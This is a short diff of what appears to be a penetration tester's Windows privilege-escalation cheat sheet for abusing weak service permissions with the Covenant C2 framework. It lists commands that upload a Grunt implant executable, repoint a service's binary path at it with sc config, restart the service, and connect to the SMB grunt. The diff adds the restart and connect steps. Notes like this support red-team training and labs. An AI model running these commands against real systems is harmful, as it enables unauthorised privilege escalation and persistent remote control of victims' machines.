@@ -21,7 +21,7 @@ services.msc
 sc query
 Get-Service | Format-List
 
-Weak Service Permissions
+#Weak Service Permissions
 From Covenant:
 SharpUp
 Import PowerShellImport Get-ServiceAcl.ps1
@@ -30,6 +30,8 @@ Upload /filepath:"C:\Windows\Temp\GruntSMB_svc.exe"
 Shell sc config "service" binPath= "C:\Windows\Temp\GruntSMB"
 Shell sc qc "service"
 Shell sc stop "service"
+shell sc start "service"
+connect localhost namesmbgrunt
 
 
 
